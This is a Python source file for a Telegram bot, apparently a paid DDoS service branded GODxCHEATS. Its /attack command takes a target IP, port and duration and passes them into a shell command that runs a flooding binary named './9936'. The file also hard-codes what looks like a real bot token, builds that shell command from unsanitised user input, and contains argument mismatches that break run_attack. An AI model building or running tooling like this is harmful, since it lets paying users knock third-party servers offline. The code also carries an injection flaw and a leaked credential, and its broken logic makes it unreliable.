import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import os
from typing import Dict

# Configuration
TELEGRAM_BOT_TOKEN = "7569939271:AAG2IU0MNFxwVCpUejniIjRrt9GKOfnO9OY"  # Consider using environment variables
ADMIN_USER_ID = 6966950770
APPROVED_IDS_FILE = 'approved_ids.txt'
CHANNEL_ID = "@UNIQUE_ENOUGH"  # Fixed: Removed trailing space
attack_in_progress = False

# Track last attack times per user
user_last_attack_time: Dict[int, float] = {}

# Load and Save Functions for Approved IDs
def load_approved_ids():
    """Load approved user and group IDs from a file."""
    try:
        with open(APPROVED_IDS_FILE, 'r') as file:
            return set(line.strip() for line in file if line.strip())
    except FileNotFoundError:
        return set()

def save_approved_ids():
    """Save approved user and group IDs to a file."""
    with open(APPROVED_IDS_FILE, 'w') as file:
        file.write("\n".join(approved_ids))

approved_ids = load_approved_ids()

# Helper Function: Check User Permissions
async def is_admin(chat_id):
    """Check if the user is the admin."""
    return str(chat_id) == str(ADMIN_USER_ID)  # Convert both to string for consistent comparison

async def is_member_of_channel(user_id: int, context: CallbackContext):
    """Check if the user is a member of the specified channel."""
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(f"Error checking channel membership: {e}")
        return False

# Commands
async def start(update: Update, context: CallbackContext):
    """Send a welcome message to the user."""
    chat_id = update.effective_chat.id
    message = (
        "*🔥 𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝑮𝑶𝑫𝒙𝑪𝑯𝑬𝑨𝑻𝑺 🔥*\n\n"
        "*🚀 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑩𝑶𝑻 - 𝒀𝒐𝒖𝒓 𝒆𝒏𝒕𝒓𝒚 𝑻𝑶 𝑻𝑯𝑬 𝑵𝑬𝑿𝑻 𝑳𝑬𝑽𝑬𝑳 🚀*\n"
        "*𝑶𝑾𝑵𝑬𝑹*: @MiddleAura\n"
        "*🔑 𝑼𝑵𝑳𝑶𝑪𝑲 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑭𝑬𝑨𝑻𝑼𝑹𝑬𝑺\n"
        "*𝗝𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗼 𝗲𝘅𝗽𝗹𝗼𝗿𝗲 𝗮𝗱𝘃𝗮𝗻𝗰𝗲𝗱 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀 𝗮𝗻𝗱 𝘀𝘁𝗮𝘆 𝘂𝗽𝗱𝗮𝘁𝗲𝗱 𝗼𝗻 𝗲𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝘁𝗶𝗽𝘀!\n"
        f"🔔 *𝗝𝗼𝗶𝗻 𝗵𝗲𝗿𝗲*: {CHANNEL_ID}.\n\n"
        "𝗧𝘆𝗽𝗲 /help 𝘁𝗼 𝗲𝘅𝗽𝗹𝗼𝗿𝗲 𝗮𝗹𝗹 �𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗮𝗻𝗱 𝘂𝗻𝗹𝗼𝗰𝗸 𝘁𝗵𝗲 𝗽𝗼𝘄𝗲𝗿 𝗼𝗳 𝗼𝘂𝗿 𝗯𝗼𝘁!"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    """Send a list of available commands and their usage."""
    chat_id = update.effective_chat.id
    message = (
        "*✨ 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺 ✨*\n\n"
        "*🚀 /start* - 𝑆𝑡𝒶𝓇𝓉 𝓉𝒽𝑒 𝒷𝑜𝓉 𝒶𝓃𝒹 𝑔𝑒𝓉 𝒶 𝓌𝑒𝓁𝒸𝑜𝓂𝑒 𝓂𝑒𝓈𝓈𝒶𝑔𝑒.\n\n"
        "*🛠 /help* - 𝒮𝒽𝑜𝓌 𝒶 𝒽𝑒𝓁𝓅 𝓂𝑒𝓈�𝒶𝑔𝑒 𝓌𝒾𝓉𝒽 𝒶𝓁𝓁 𝓬𝑜𝓂𝓂𝒶𝓃𝒹𝓈.\n\n"
        "*🔒 /approve <id>* - 𝒜𝓅𝓅𝓇𝑜𝓋𝑒 𝒶 𝓊𝓈𝑒𝓇 𝑜𝓇 𝑔𝓇𝑜𝓊𝓅 𝒾𝒹 (𝒶𝒹𝓂𝒾𝓃 𝑜𝓃𝓁𝓎).\n\n"
        "*❌ /remove <id>* - 𝑅𝑒𝓂𝑜𝓋𝑒 𝒶 𝓊𝓈𝑒𝓇 𝑜𝓇 𝑔𝓇𝑜𝓊� 𝒾𝒹 (𝒶𝒹𝓂𝒾𝓃 𝑜𝓃𝓁𝓎).\n\n"
        "*📊 /details* - 𝒮𝒽𝑜𝓌 𝒶𝓉𝓉𝒶𝒸𝓀 𝓈𝓉𝒶𝓉𝓈 (𝒶𝒹𝓂𝒾𝓃 𝑜𝓃𝓁𝓎).\n\n"
        "*💥 /attack <ip> <port> <time>* - 𝐿𝒶𝓊𝓃𝒸𝒽 𝒶𝓃 𝒶𝓉𝓉𝒶𝒸𝓀 (𝒶𝓅𝓅�𝓇𝑜𝓋𝑒𝒹 𝓊𝓈𝑒𝓇𝓈 𝑜𝓃𝓁𝓎).\n\n"
        "*🔑 𝑵𝑶𝑻𝑬:* 𝒲𝑒 𝒹𝑜 𝓃𝑜� 𝒸𝑜𝓂𝑒𝓃𝒹 𝒶𝓃𝓎 𝓊𝓃𝒶𝓊𝓉𝒽𝑜𝓇𝒾𝓏𝑒𝒹 𝓊𝓈𝑒.\n\n"
        "𝒮𝑒𝓁𝒻-𝒸𝒶𝓇𝑒 𝒾𝓈 𝑒𝓈𝓈𝑒𝓃𝓉𝒾𝒶𝓁, 𝓅𝓁𝑒𝒶𝓈𝑒 𝓊𝓈𝑒 𝒷𝑜𝓉 𝓇𝑒𝓈𝓅𝑜𝓃𝓈𝒾𝒷𝓁𝓎."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    """Approve a user or group ID to use the bot."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if not target_id.lstrip('-').isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid ID format. Must be a numeric ID.*", parse_mode='Markdown')
        return

    approved_ids.add(target_id)
    save_approved_ids()
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    """Remove a user or group ID from the approved list."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.remove(target_id)
        save_approved_ids()
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

async def alluser(update: Update, context: CallbackContext):
    """List all approved users and groups."""
    chat_id = update.effective_chat.id

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if not approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*No approved users found.*", parse_mode='Markdown')
        return

    user_list = "\n".join(approved_ids)
    await context.bot.send_message(chat_id=chat_id, text=f"*Approved Users and Groups:*\n\n{user_list}", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    """Launch an attack if the user is approved and a channel member."""
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    user_username = update.effective_user.username or "N/A"
    args = context.args

    # Check if the user is approved
    if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    # Check if the user is a member of the channel
    if not await is_member_of_channel(user_id, context):
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
        return

    # Check if an attack is already in progress
    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please wait for the current attack to finish.*", parse_mode='Markdown')
        return

    # Check if 120 seconds have passed since the last attack
    current_time = asyncio.get_event_loop().time()
    last_attack_time = user_last_attack_time.get(user_id, 0)

    if current_time - last_attack_time < 120:
        remaining_time = 120 - (current_time - last_attack_time)
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Please wait {int(remaining_time)} seconds before launching another attack.*",
            parse_mode='Markdown'
        )
        return

    # Process the attack
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args
    image_url = "https://wallpapers.com/anime-love-pictures"
    
    try:
        await context.bot.send_photo(
            chat_id=chat_id, 
            photo=image_url, 
            caption=(
                f"*💥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗘𝗗! 💥*\n\n"
                f"*🎯 𝑇𝒜𝑅𝒢𝐸𝒯 𝗜𝗣:* {ip}\n"
                f"*🔌 𝑇𝒜𝑅𝒢𝐸𝒯 𝒫𝒪𝑅𝒯:* {port}\n"
                f"*⏱ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗜𝗠𝗘:* {time} 𝓈𝑒𝒸𝑜𝓃𝒹𝓈\n"
                f"*👤 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗 𝗕𝗬:* @{user_username}\n"
                f"⚡ *𝒜𝒯𝒯𝒜𝒞𝒦 𝒾𝓃 𝓅𝓇𝑜𝑔𝓇𝑒𝓈𝓈...* ⚡\n\n"
                f"Please wait for the attack to complete. Stay tuned!"
            ), 
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Error sending photo: {e}")
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*💥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗘𝗗! 💥*\n\n"
                f"*🎯 𝑇𝒜𝑅𝒢𝐸𝒯 𝗜𝗣:* {ip}\n"
                f"*🔌 𝑇𝒜𝑅𝒢𝐸𝒯 𝒫𝒪𝑅𝒯:* {port}\n"
                f"*⏱ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗜𝗠𝗘:* {time} 𝓈𝑒𝒸𝑜𝓃𝒹𝓈\n"
                f"*👤 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗 𝗕𝗬:* @{user_username}\n"
                f"⚡ *𝒜𝒯𝒯𝒜𝒞𝒦 𝒾𝓃 𝓅𝓇𝑜𝑔𝓇𝑒𝓈𝓈...* ⚡\n\n"
                f"Please wait for the attack to complete. Stay tuned!"
            ),
            parse_mode='Markdown'
        )

    # Save the attack timestamp for the user
    user_last_attack_time[user_id] = current_time

    # Simulate the attack process
    asyncio.create_task(run_attack(chat_id, ip, port, time, context, user_username))

async def run_attack(chat_id, ip, port, time, context):
    """Simulate an attack process."""
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./9936 {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text=f"*🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗 🔥*\n\n"
                                                            f"*➤ 𝗧𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 𝗯𝘆 @{user_username}!*\n\n"
                                                            f"* ➤ 𝗢𝗪𝗡𝗘𝗥 :- @MiddleAura*\n\n"
                                                            f"➤ *𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦* 💥\n"
                                                            f" ➤ *𝑰𝑷*: {ip}\n"
                                                            f"➤ *𝑷𝒐𝒓𝒕*: {port}\n"
                                                            f" ➤ *𝑻𝒊𝒎𝒆*: {time} 𝓈𝑒𝒸𝑜𝓃𝒹𝓈\n"
                                                            f"⚡ *𝗦𝗧𝗔𝗧𝗨𝗦*: 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!", parse_mode='Markdown')

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("alluser", alluser))
    application.add_handler(CommandHandler("attack", attack))

    print("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
